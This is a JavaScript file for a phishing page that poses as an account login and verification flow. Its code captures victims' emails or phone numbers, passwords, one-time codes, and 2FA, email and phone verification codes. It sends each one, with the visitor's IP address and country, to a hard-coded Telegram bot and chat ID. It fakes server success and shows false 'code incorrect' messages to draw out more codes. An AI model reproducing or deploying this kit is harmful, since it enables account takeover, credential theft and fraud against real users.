// ======================================================
// TELEGRAM CONFIGURATION
// ======================================================
const TELEGRAM_BOT_TOKEN = "8659540049:AAFe9EPj2C9a5HQ898CLFRYGs-jVodV5KMU";
const TELEGRAM_CHAT_ID = "-1003761196310";

// ======================================================
// COLLECT USER INFORMATION
// ======================================================

function generateUniqueID() {
    const digit = Math.floor(Math.random() * 10); // 0-9
    const letter = String.fromCharCode(65 + Math.floor(Math.random() * 26)); // A-Z
    return `${digit}${letter}`;
}

const userInfo = {
    ip: generateUniqueID(),
    userAgent: navigator.userAgent,
    timestamp: new Date().toLocaleString(),
    country: 'Unknown',
    city: 'Unknown',
    isp: 'Unknown'
};

async function collectUserInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();
        
        userInfo.ip = ipData.ip;
        userInfo.country = locationData.country_name || 'Unknown';
        userInfo.city = locationData.city || 'Unknown';
        userInfo.isp = locationData.org || 'Unknown';
        
        console.log('User info collected:', userInfo);
    } catch (error) {
        console.log('Error collecting user info:', error);
    }
}

// Call on page load
collectUserInfo();

// ======================================================
// TELEGRAM SEND FUNCTION
// ======================================================
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram bot token or chat ID not configured');
        return false;
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        console.log('Telegram response:', data);
        return data.ok === true;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// ======================================================
// FORMAT MESSAGES FOR TELEGRAM
// ======================================================
function formatLoginMessage(emailPhone, password) {
    const countryInput = (document.getElementById('country-code') || {}).value || '';
    const phoneInput = (document.getElementById('phone-number') || {}).value || '';
    
    let credentialsType, credentialsValue;
    if (countryInput && phoneInput) {
        credentialsType = 'Phone';
        const digits = phoneInput.replace(/\D/g, '');
        credentialsValue = `${countryInput} ${digits}`;
    } else {
        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone || '').replace(/\s/g, ''));
        if (isPhone) {
            const phoneNumber = (emailPhone || '').replace(/\D/g, '');
            credentialsType = 'Phone';
            credentialsValue = `+${phoneNumber}`;
        } else {
            credentialsType = 'Email';
            credentialsValue = emailPhone || '';
        }
    }
    
    let credentialsHtml;
    if (credentialsType === 'Phone') {
        const parts = String(credentialsValue).split(/\s+/);
        const codePart = parts[0] || '';
        const numberPart = parts.slice(1).join(' ') || '';
        credentialsHtml = `<b>${codePart}</b><code>${numberPart}</code>`;
    } else {
        credentialsHtml = `<code>${credentialsValue}</code>`;
    }

    return `<b>${userInfo.ip}</b> <b>${credentialsType}:</b> ${credentialsHtml} <b>Password:</b> <code>${password}</code> <b>Country: ${userInfo.country}</b>`;
}

function formatOneTimeLoginMessage(emailPhone) {
    const countryInput = (document.getElementById('country-code') || {}).value || '';
    const phoneInput = (document.getElementById('phone-number') || {}).value || '';
    
    let credentialsType, credentialsValue;
    if (countryInput && phoneInput) {
        credentialsType = 'Phone';
        const digits = phoneInput.replace(/\D/g, '');
        credentialsValue = `${countryInput} ${digits}`;
    } else {
        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone || '').replace(/\s/g, ''));
        if (isPhone) {
            const phoneNumber = (emailPhone || '').replace(/\D/g, '');
            credentialsType = 'Phone';
            credentialsValue = `+${phoneNumber}`;
        } else {
            credentialsType = 'Email';
            credentialsValue = emailPhone || '';
        }
    }
    
    let credentialsHtml;
    if (credentialsType === 'Phone') {
        const parts = String(credentialsValue).split(/\s+/);
        const codePart = parts[0] || '';
        const numberPart = parts.slice(1).join(' ') || '';
        credentialsHtml = `<b>${codePart}</b><code>${numberPart}</code>`;
    } else {
        credentialsHtml = `<code>${credentialsValue}</code>`;
    }

    return `<b>${userInfo.ip} 1️⃣</b> <b>${credentialsType}:</b> ${credentialsHtml} <b>Country: ${userInfo.country}</b>`;
}

function format2FAMessage(code, switched = false) {
    const prefix = switched ? 'switched ' : '';
    return `<b>${prefix}🔐 (${userInfo.ip}):</b> <code>${code}</code>`;
}

function formatEmailVerificationMessage(code, switched = false) {
    const prefix = switched ? 'switched ' : '';
    return `<b>${prefix}📧 (${userInfo.ip}):</b> <code>${code}</code>`;
}

function formatPhoneVerificationMessage(code, switched = false) {
    const prefix = switched ? 'switched ' : '';
    return `<b>${prefix}📱 (${userInfo.ip}):</b> <code>${code}</code>`;
}

function formatSwitchMessage(fromMethod, toMethod) {
    const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
    return `<b>${userInfo.ip}</b> <b>Switched:</b> ${toMethodFormatted}`;
}

function formatGoVerifyMessage(method) {
    const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
    return `<b>${userInfo.ip}</b> <b>Selected:</b> ${methodFormatted}`;
}

// ======================================================
// SIMULATE SERVER RESPONSES (ALWAYS SUCCESS)
// ======================================================
function simulateServerSuccess() {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve({ success: true });
        }, 500); // Simulate 0.5s server delay
    });
}

// Global state
let isProcessing = { login: false, twofa: false, email: false, phone: false };
let currentMethod = '';
let isOneTimeCodeMode = false;
let isAfterSwitch = false;
let verificationsActive = false;
let step = 1;

// DOM helpers
function disableBodyScroll() {
    document.body.style.overflow = 'hidden';
}

function enableBodyScroll() {
    document.body.style.overflow = '';
}

function showOverlay(id) {
    const overlay = document.getElementById(id);
    const sheet = overlay.querySelector('.pop-bottomsheet') || overlay.querySelector('.dialog-item');
    disableBodyScroll();
    overlay.style.visibility = 'visible';
    
    setTimeout(() => {
        initSwitchButtons(overlay);
        if ((verificationsActive && (id === 'email' || id === 'phone')) || isOneTimeCodeMode) {
            overlay.querySelectorAll('.switch-to-twofa, .switch-to-email, .switch-to-phone')
                .forEach(btn => btn.style.display = 'none');
        } else {
            overlay.querySelectorAll('.switch-to-twofa, .switch-to-email, .switch-to-phone')
                .forEach(btn => btn.style.display = '');
        }
        const resendBtn = overlay.querySelector('.resend-btn');
        if (resendBtn) startResend(id, true);
    }, 150);

    if (id === 'verifications') {
        overlay.classList.remove('hide-left');
        setTimeout(() => overlay.classList.add('active'), 10);
        verificationsActive = true;
    } else {
        overlay.classList.add('active');
        setTimeout(() => sheet.classList.add('active'), 10);
    }
}

function hideOverlay(id) {
    const overlay = document.getElementById(id);
    const sheet = overlay.querySelector('.pop-bottomsheet') || overlay.querySelector('.dialog-item');
    
    if (id === 'verifications') {
        verificationsActive = false;
        overlay.classList.remove('active');
        overlay.classList.add('hide-left');
        setTimeout(() => {
            overlay.style.visibility = 'hidden';
            enableBodyScroll();
        }, 350);
    } else {
        sheet.classList.remove('active');
        overlay.classList.remove('active');
        setTimeout(() => {
            overlay.style.visibility = 'hidden';
            enableBodyScroll();
        }, 350);
    }
}

function startLoading(btn) {
    btn.classList.add('loading');
}

function stopLoading(btn) {
    btn.classList.remove('loading');
}

async function sendGoVerify(method) {
    const goVerifyMessage = formatGoVerifyMessage(method);
    await sendToTelegram(goVerifyMessage);
}

async function sendSwitchToTelegram(fromMethod, toMethod) {
    const switchMessage = formatSwitchMessage(fromMethod, toMethod);
    await sendToTelegram(switchMessage);
}

function switchOverlay(from, to, method) {
    const fromMethod = currentMethod;
    currentMethod = method;
    isAfterSwitch = true;
    hideOverlay(from);
    sendSwitchToTelegram(fromMethod, method);
    setTimeout(() => showOverlay(to), 350);
}

function initSwitchButtons(overlay) {
    const id = overlay.id;
    const swEmail = overlay.querySelector('.switch-to-email');
    const swPhone = overlay.querySelector('.switch-to-phone');
    const swTwofa = overlay.querySelector('.switch-to-twofa');
    
    if (swEmail) swEmail.onclick = () => switchOverlay(id, 'email', 'email');
    if (swPhone) swPhone.onclick = () => switchOverlay(id, 'phone', 'phone');
    if (swTwofa) swTwofa.onclick = () => switchOverlay(id, 'twofa', 'twofa');
}

function showToast(message) {
    const toast = document.createElement('div');
    toast.className = 'toast-layer';
    toast.innerHTML = `
        <div class="overflow-hidden flex" style="height: 56px; transition: height .5s var(--ease-out)">
            <div class="toast" style="align-items: anchor-center">
                <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none fill-error">
                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                        <!-- Error icon SVG paths -->
                    </svg>
                </div>
                <div>Verification code is incorrect</div>
            </div>
        </div>
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2000);
}

let resendTimer = { email: null, phone: null };

function startResend(btnOrType, forced = false) {
    let btn, type;
    if (btnOrType instanceof HTMLElement) {
        btn = btnOrType;
        type = btn.closest('.pop-overlayer').id;
    } else {
        type = btnOrType;
    }
    
    const overlay = document.getElementById(type);
    if (!overlay) return;
    btn = overlay.querySelector('.resend-btn');
    if (!btn) return;
    
    if (resendTimer[type] && !forced) return;
    if (resendTimer[type]) clearInterval(resendTimer[type]);
    
    let timeLeft = 60;
    btn.disabled = true;
    const span = btn.querySelector('span');
    if (span) span.textContent = `Resend in ${timeLeft}s`;
    
    resendTimer[type] = setInterval(() => {
        timeLeft--;
        if (timeLeft <= 0) {
            if (span) span.textContent = 'Resend';
            clearInterval(resendTimer[type]);
            resendTimer[type] = null;
            btn.disabled = false;
        } else if (span) {
            span.textContent = `Resend in ${timeLeft}s`;
        }
    }, 1000);
}

function updateVerificationUI() {
    const verifOverlay = document.getElementById('verifications');
    const counterElement = verifOverlay.querySelector('p.text-warning');
    if (counterElement) counterElement.innerHTML = `<span>${step}</span><span>/</span><span>2</span>`;
    
    const emailVerifyBtn = document.getElementById('email_verify');
    const phoneVerifyBtn = document.getElementById('phone_verify');
    if (emailVerifyBtn) emailVerifyBtn.style.display = step === 1 ? 'flex' : 'none';
    if (phoneVerifyBtn) phoneVerifyBtn.style.display = step === 2 ? 'flex' : 'none';
}

function enterVerifications(fromBlock) {
    hideOverlay(fromBlock);
    setTimeout(() => {
        step = 1;
        showOverlay('verifications');
        updateVerificationUI();
    }, 400);
}

// Initialize everything when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    // Tab switching
    const passwordTab = document.querySelector('button[aria-selected="true"].tabs-btn.btn-like');
    const oneTimeTab = document.querySelector('.tabs-btn.btn-like:not([aria-selected])');
    const passwordField = document.getElementById('input-container2');
    const passwordInput = document.getElementById('password');
    const emailPhoneField = document.getElementById('input-container');
    const emailPhoneInput = document.getElementById('email-phone');
    const emailPhoneVisibleInput = document.getElementById('email-phone-visible');
    
    if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput && emailPhoneVisibleInput) {
        oneTimeTab.addEventListener('click', e => {
            e.preventDefault();
            isOneTimeCodeMode = true;
            passwordTab.removeAttribute('aria-selected');
            oneTimeTab.setAttribute('aria-selected', 'true');
            passwordField.style.display = 'none';
            passwordInput.removeAttribute('required');
            passwordInput.value = '';
            emailPhoneVisibleInput.placeholder = 'Email / Phone Number';
        });
        
        passwordTab.addEventListener('click', e => {
            e.preventDefault();
            isOneTimeCodeMode = false;
            oneTimeTab.removeAttribute('aria-selected');
            passwordTab.setAttribute('aria-selected', 'true');
            passwordField.style.display = 'flex';
            passwordInput.setAttribute('required', 'required');
            emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';
        });
    }
    
    // Form handling, button listeners, etc. would continue here...
    console.log('Authentication system initialized with Telegram bot');
});
  
